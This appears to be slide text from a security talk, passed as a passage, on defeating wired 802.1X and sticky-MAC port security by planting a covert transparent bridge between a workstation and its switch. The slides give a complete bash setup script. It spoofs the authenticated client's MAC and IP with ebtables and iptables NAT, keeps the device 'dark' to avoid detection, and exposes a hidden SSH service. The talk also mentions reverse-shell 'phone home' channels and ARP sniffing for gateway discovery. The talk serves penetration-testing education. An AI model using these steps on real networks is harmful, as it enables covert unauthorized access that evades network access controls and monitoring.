• Callouts (both forward and reverse)
Careful!  Thar be dragons!
A common configuration includes sticky-MAC 
address filtering on the wire along with 802.1X.
• Need to make sure the MAC address of traffic 
coming out of the bridge matches the client 
computer
• 802.1X usually re-authenticates periodically and 
usually can be forced without incident
• Port security violations usually are manually 
cleared, so tripping is BAD, and unfortunately 
easy to do
Tripping Sticky MAC Port Security
A single stray source MAC address will trigger 
port security.
• Need to make sure no traffic leaves until 
everything is set up
• Start dark and slowly bring up functionality 
until we’re good to go
Things That Bite
Things I’ve been bitten with while working with port security:
•
Excess Services (web server, etc)
– What’s the first thing that apache does when it starts up?  Query a name 
server for it’s own IP address…
•
IPV6
– Since I’m not doing anything to NAT any IPV6 traffic,  if any escapes the 
bridge it’ll burn us.  Best to just disable
•
DNS
– Sometimes simply having entries in resolv.conf generate traffic unexpectedly 
upon startup (depends on distro)
– Easy to avoid, simply rm /etc/resolv.conf at boot
•
ARP
– Ultimately the cause of most problems – something gets ARP’d
Arptables
Arptables allows us to block all ARP traffic from an 
interface.  Since ARP usually burns us, we can block 
all traffic originating from our device easily. 
#example arptables command
arptables –A OUTPUT –o eth1 –j DROP
Note:  We want ARP traffic to cross the bridge, just 
not leave being sourced by our rogue device
(IP/ARP/EB)tables  Chain Flow Overview
Prerouting – All traffic off the wire
Forward – traffic passing from one interface to another
Input – traffic destined for the local device
Output – traffic leaving the local device from processes
Postrouting – all traffic leaving the device
(IP/ARP/EB)tables Notes:
• All traffic crossing the bridge will traverse the 
prerouting -> forward -> postrouting chains
• If we drop all traffic from the output chain, we 
can  prevent our device from inadvertently 
tripping port security without affecting traffic 
on the bridge
Mimicking The Client
MAC addresses are trivial to spoof, so that 
shouldn’t be a problem.  However since we’re 
using a bridge (layer 2) that can cause some 
problems since interaction requires layer 3.
We will use a combination of ebtables and 
iptables to handle our NAT requirements
Ebtables
Ebtables behaves somewhat like IPtables at the 
link layer.
• Provides link layer filtering
• Allows us to NAT with MAC addresses
More on this in a few slides…
Communication Channels
We want to be able to talk to the bridge.  We 
can either contact it directly or have it call us.
Either way we need to make traffic originating 
from the bridge appear to come from the 
authenticated machine.
Master of Disguise
Using IP tables, and knowing the IP address of 
the computer we’re inline with, we can NAT our 
traffic using source NAT (SNAT) and iptables:
iptables -t nat -A POSTROUTING -s 192.168.1.10 
-p tcp -j SNAT --to 1.2.3.4
iptables -t nat -A POSTROUTING -s 192.168.1.10 
-p udp -j SNAT --to 1.2.3.4
One Quick Caveat (Perfect World)
Modern TCP/IP stacks track connections by using 
the tuple (SRC IP, SRC PT, DST IP, DST PT). If we 
communicate with hosts on the same network 
(say a Domain Controller) then we would match 
SRC IP, DST IP and DST PT.  This leaves us a 1 in 
65000 chance of matching a connection that 
could be already established.  What would 
happen in this event?
We could adversely affect operations on the 
computer behind us and risk discovery.
One Quick Caveat (MS Reality ™)
It’s actually worse than that.  They of infinite and 
infallible wisdom have deigned that 65535 is too 
big a number (I mean it’s 16 whole bits), so they 
put limits on what source ports traffic will 
originate from.
Ephemeral Source Ports
XP/2003 – TCP/UDP ports 1025 – 5000
Vista/7/2008 – TCP/UDP ports 49152 - 65535  
One Quick Mitigation
If we restrict via SNAT the ports with which we NAT 
through, depending on the OS we could eliminate the 
overlap altogether.  Or we could risk the overlap and 
have our traffic blend in better.  I chose to use ports in 
the back half of the range for vista/7/2008 to blend in.
#mangle the destination IP to 1.2.3.4 ports 61000-62000
iptables -t nat -A POSTROUTING -s 192.168.1.10 -p tcp -j 
SNAT --to 1.2.3.4:61000-62000
iptables -t nat -A POSTROUTING -s 192.168.1.10-p udp -j 
SNAT --to 1.2.3.4:61000-62000
Creating a Hidden Service
We can use Destination NAT (DNAT) to create a 
hidden service on our rogue device for 
communication.
For Example: If we start up a SSH server on 
127.0.0.1 on the device, we can use the following 
iptables rule to redirect port 9876 to it:
iptables -t nat -A PREROUTING –d 192.168.1.10 -p tcp
--dport 9876 -j DNAT --to 127.0.0.1:22
Hidden Service 2
We can actually include our outside source IP as 
part of the rule and further restrict who can see the 
hidden service.  So if anybody else tries to go to 
that port they’d actually get passed on to the 
computer, which probably isn’t listening there!
iptables -t nat -A PREROUTING –s 1.2.3.4 –d 
192.168.1.10 -p tcp --dport 9876 -j DNAT --to 
127.0.0.1:22
Don’t Call Us, We’ll Call You
We can also have our bridge contact us instead 
of us contacting it (reverse shell).
• Probably makes more sense given the security 
– If they’ve got 802.1X, they probably don’t let any 
port traffic in to their workstations
• Plenty of options to phone home
– SSH
– Openvpn
– Many many more
Choosing An IP
We need an IP for the bridge in order to NAT.  So 
what IP do we use?
I picked an IP that shouldn’t be in use on the 
network.  I chose an IP in 169.254.0.0, which is 
self-assigned in the event that an interface can’t 
talk to its DHCP server.  In other words, you 
shouldn’t see it on a production network unless 
there’s some sort of problem…
Interaction With the Client
Before we get too far down the rabbit hole, I 
wanted to mention that I haven’t really found 
any decent way of directly attacking the 
computer behind the bridge.
What source IP do you use?  We’d need to 
source NAT in that direction and without a good 
patsy computer, there’s no good way of doing it.
The Pre-Populated Setup
Our Scenario:
We’re doing a full scope pen test on an 
organization that’s using wired 802.1X security.
The folks responsible for testing physical security 
have done recon and found a perfect hiding spot 
in a printer stand.  They return with a printer 
configuration page with all the network info 
we’d need.
Bringing It All Together
#!/bin/bash
SWMAC=f0:ad:4e:00:02:46
# The switch side mac
COMPMAC=c0:c1:c0:76:35:7c   # provided by printer conf
COMIP=192.168.0.10                   #
GWNET=192.168.0.0/24              #
DEFGW=192.168.0.15                   #
BRINT=br0
SWINT=eth0
# the switch side interface name
COMPINT=eth3
# the computer side interface name
BRIP=169.254.66.66
# bridge IP
DPORT=9876
# incoming port to redirect to ssh
RANGE=61000-62000
# our SNAT port range
Bringing It All Together (2)
#build the bridge
brctl addbr $BRINT
brctl addif $BRINT $COMPINT
brctl addif $BRINT $SWINT
#bring up both sides of the bridge
ifconfig $COMPINT 0.0.0.0 up promisc
ifconfig $SWINT 0.0.0.0 up promisc
#start dark
arptables -A OUTPUT -j DROP
iptables -A OUTPUT -j DROP
Bringing It All Together (3)
# swap the mac address to the switch side mac, 
# so we always know which mac the bridge is
macchanger -m $SWMAC $BRINT
# bring up the bridge with the non-routable IP
ifconfig $BRINT $BRIP up promisc
# add the network info
# add the default route
route  add -net $GWNET dev $BRINT
route add default gw $DEFGW
Bringing It All Together (4)
# use ebtables to source NAT the $COMPMAC 
# for traffic leaving the device
# from the bridge mac address
ebtables -t nat -A POSTROUTING -s $SWMAC -o 
$SWINT -j snat --to-src $COMPMAC
#use DNAT to map $DPORT to $BRIP:22
iptables -t nat -A PREROUTING -i br0 -d $COMIP -p 
tcp --dport $DPORT -j DNAT --to $BRIP:22
Bringing It All Together (5)
# set up the source nat rules for tcp/udp/icmp
iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p tcp -j SNAT --to 
$COMIP:$RANGE
iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p udp -j SNAT --to 
$COMIP:$RANGE
iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p icmp -j SNAT --to 
$COMIP
#start sshd
/etc/init.d/ssh start
#lift radio silence
arptables -D OUTPUT -j DROP
iptables -D OUTPUT -j DROP
Pre-Populated Demo
AUTOMATION
Automation
Pre-populating the bridge info is cool and all, but 
how can we fully automate the process?
1. Start transparent
2. Gather info
3. Analyze info
4. Bring up the bridge
Tell Me What You Want…
The “printer config” from our demonstration 
provided us with the following information:
• IP Address 
• MAC address
• Network mask
• Gateway IP
What if we can’t get that info from our recon?
Tell Me What You Need…
Recalling our previous discussions about routing, 
what we really need is:
• IP address of the computer
• MAC address of the computer
• MAC address of the gateway
The only thing we needed the network 
mask/gateway IP for was to figure out how to route 
to it.  All we need to route packets is the destination 
MAC address.
We’ve Got a Gateway MAC, Now What?
We create a static ARP entry using the gateway 
MAC using a bogus IP address on the same 
network as the bridge IP.  
We then create a default route going to that IP.
This will allow us to route to the actual gateway 
without needing to know the network mask. 
A Quick Note
Using a static ARP entry for a bogus route will cause 
some strange behavior on the local wire when we 
communicate on the local subnet.
Since we don’t have a route for the local network in the 
routing table, all packets destined for the local subnet 
will get routed to the default gateway.
It still works though, the gateway will simply forward 
the packets to the local destination.  Although any 
return traffic will travel from the remote host directly to 
us.
Typical Network Assumptions
If an organization has 802.1X deployed, we can 
make some reasonable assumptions about their 
infrastructure:
• Network segmented by function (svr/wksn)
• Central router / firewall connecting everything 
together
• Network services (AD/DNS/WWW) probably 
not in the workstation segment
Passive Aggressive
So, if we watch the packets crossing the bridge, 
we can passively gather the information we 
need.  What sorts of traffic would we expect to 
see?
• UDP (netbios/DNS/LDAP)
• ARP
• TCP (AD / WWW / email)
UDP Analysis
What sorts of stuff do you see on the wire with 
UDP?
• DNS – variable amounts
• LDAP – variable amounts
• Net Noise Bios – broadcast traffic, not helpful
• DHCP – broadcast traffic, not helpful
UDP Consensus
While there is some traffic that would be worth 
watching, UDP doesn’t look like the way to go
Too much broadcast traffic wouldn’t really be 
helpful and not enough of the rest of the traffic 
to make a useful determination.
Although getting the DNS server might be worth 
it for future use ☺
ARP Analysis
ARP seems like a decent place to look.  Using the –nne
flags for tcpdump (no DNS/numerical resolution and 
show the ethernet layer)  We know there’s going to be a 
lot of ARP traffic on the wire.
# tcpdump -i eth0 -nne arp
18:26:42.972381 00:26:b9:1b:02:97 > ff:ff:ff:ff:ff:ff, 
ethertype ARP (0x0806), length 60: arp who-has 
192.168.15.1 tell 192.168.15.129
18:26:37.993919 00:1b:fc:9d:2e:ef > 00:26:b9:1b:02:97, 
ethertype ARP (0x0806), length 60: arp reply 
192.168.15.1 is-at 00:1b:fc:9d:2e:ef
ARP Analysis (2)
So for our example, we can get all the information 
we need from ARP.  Assuming a moderately 
populated Windows network, there should be a 
steady stream of ARP broadcasts to monitor.  
Remember from the first few slides that ARP cache 
timeouts are relatively short for windows boxes 
(15s-120s).
We can simply gather some ARP traffic, figure out 
what the most requested host is and that will more 
than likely be our gateway.
ARP: The Downside
Unfortunately ARP does have its downside as 
well.  If there are services on the local wire or a 
lot of intersegment traffic, then the most ARP’d
for entry might not be our gateway.
ARP Consensus
It’s not a bad option, but maybe there’s better.
On the plus side, on a reasonably sized network 
there should be lots of ARP traffic and most of it 
should be heading towards the gateway.  So we 